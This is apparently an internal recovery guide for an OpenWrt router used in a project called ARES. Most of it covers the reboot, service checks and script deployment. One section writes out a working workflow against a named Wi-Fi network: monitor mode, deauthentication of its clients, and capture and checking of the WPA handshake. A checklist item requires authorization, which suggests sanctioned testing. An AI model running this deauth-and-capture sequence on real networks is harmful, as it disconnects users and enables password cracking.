# ARES Router Recovery Guide

**Date**: January 15, 2026
**Incident**: Router services crashed during monitor mode test
**Status**: Router needs physical reboot

---

## 🔴 Current Situation

### What Happened
- Set production AP interface (phy0-ap0) to monitor mode during first capture test
- This killed the active AP broadcasting "OpenWrt" SSID
- SSH service crashed or stopped responding
- ZeroTier connection lost

### Current Router Status
```
Office Network IP: 10.0.0.81 (pingable ✅)
ZeroTier IP: 10.73.168.3 (unreachable ❌)
SSH Service: Connection refused ❌
Web Interface: Not responding ❌

Diagnosis: Network stack alive (responds to ping), but all services down
```

---

## ⚡ Recovery Steps

### Option 1: Physical Reboot (RECOMMENDED)

**Steps**:
1. Physically power cycle the router
   - Unplug power cable
   - Wait 10 seconds
   - Plug back in
2. Wait 2 minutes for full boot
3. Verify connectivity:
   ```bash
   # Check ZeroTier
   ping 10.73.168.3

   # Check SSH
   ssh root@router
   ```

**Expected Result**: Router should boot normally, ZeroTier should reconnect automatically

---

## ✅ Post-Recovery Actions

Once router is back online, execute these steps:

### Step 1: Verify Services
```bash
# Check ZeroTier status
ssh root@router "zerotier-cli status"

# Check wireless status
ssh root@router "wifi status"

# Check system status
ssh root@router "uptime; free -m; df -h"
```

### Step 2: Deploy Updated Control Script
```bash
# Backup old script
ssh root@router "cp /root/ares_control.sh /root/ares_control_v1_backup.sh"

# Deploy new script (uses virtual interface)
scp /Users/vibhavaggarwal/Projects/ARES/Scripts/ares_control_v2.sh root@router:/root/ares_control.sh

# Make executable
ssh root@router "chmod +x /root/ares_control.sh"

# Test status function
ssh root@router "export ARES_MODE=status; /root/ares_control.sh"
```

### Step 3: Test Virtual Interface Creation
```bash
# Test monitor mode (should NOT affect connectivity)
ssh root@router "export ARES_MODE=monitor TARGET_CHANNEL=11; /root/ares_control.sh"

# Verify AP still running
ssh root@router "wifi status | grep phy0-ap0"

# Verify mon0 created
ssh root@router "iw dev | grep mon0"

# Test from another terminal - SSH should still work
ssh root@router "export ARES_MODE=status; /root/ares_control.sh"

# Clean up
ssh root@router "export ARES_MODE=normal; /root/ares_control.sh"
```

---

## 🎯 Resume ARES Testing

Once verified working, retry the capture workflow:

### Full Capture Workflow (Corrected)
```bash
# Target: Airtel_vish_0615
TARGET_BSSID="FC:9F:2A:27:66:1F"
TARGET_CHANNEL="11"
TARGET_NAME="airtel_vish"

# Step 1: Enable monitor mode (safe - uses virtual interface)
ssh root@router "export ARES_MODE=monitor TARGET_CHANNEL=${TARGET_CHANNEL}; /root/ares_control.sh"

# Step 2: Verify connectivity still works (should succeed)
ping -c 2 10.73.168.3

# Step 3: Start capture
ssh root@router "export ARES_MODE=capture TARGET_BSSID=${TARGET_BSSID} TARGET_CHANNEL=${TARGET_CHANNEL}; /root/ares_control.sh"

# Step 4: Wait 30 seconds for capture to start
sleep 30

# Step 5: Trigger deauth to capture handshake
ssh root@router "export ARES_MODE=deauth TARGET_BSSID=${TARGET_BSSID} DEAUTH_COUNT=10; /root/ares_control.sh"

# Step 6: Wait 2-3 minutes for clients to reconnect
echo "Waiting for handshake capture (180 seconds)..."
sleep 180

# Step 7: Stop capture
ssh root@router "killall airodump-ng"

# Step 8: Check for handshake
ssh root@router "ls -lh /tmp/ares_captures/"
ssh root@router "aircrack-ng /tmp/ares_captures/*.cap | grep -i handshake"

# Step 9: Download captures
mkdir -p /opt/ares/captures
scp root@router:/tmp/ares_captures/*.cap /opt/ares/captures/

# Step 10: Restore normal operation
ssh root@router "export ARES_MODE=normal; /root/ares_control.sh"
```

---

## 📋 Pre-Flight Checklist

Before running any ARES operation, verify:

- [ ] Router accessible via ZeroTier (ping 10.73.168.3)
- [ ] SSH working (ssh root@router)
- [ ] Updated control script deployed
- [ ] Target network authorized (check Network-Authorization-20260115.md)
- [ ] Sufficient storage space (df -h / on router - need ~5-10MB free)
- [ ] Fallback access available (office network 10.0.0.81)

---

## 🚨 Emergency Recovery

If router becomes unresponsive again:

1. **Check from office network**:
   ```bash
   ssh office-server "ping 10.0.0.81"
   ```

2. **Physical reboot** (safest option)

3. **Last resort** - Factory reset:
   - Hold reset button for 10 seconds
   - Will lose all configuration including ZeroTier
   - Need to reconfigure from scratch

---

## 📚 Key Lessons

### What We Learned
1. ✅ **Never use production interfaces** for monitor mode
2. ✅ **Always create virtual interfaces** (mon0, mon1, etc.)
3. ✅ **Test connectivity** after each step
4. ✅ **Have fallback access** (office network, physical access)
5. ✅ **Document recovery procedures** before risky operations

### Updated Best Practices
- Use `iw phy phy0 interface add mon0 type monitor` instead of converting phy0-ap0
- Test virtual interface creation first before starting captures
- Keep production AP running at all times for remote access
- Always verify SSH still works after enabling monitor mode
- Have physical access available during initial testing

---

**Classification**: ARES Internal - Recovery Procedures
**Last Updated**: January 15, 2026
**Next Action**: Physical reboot router, then execute post-recovery steps
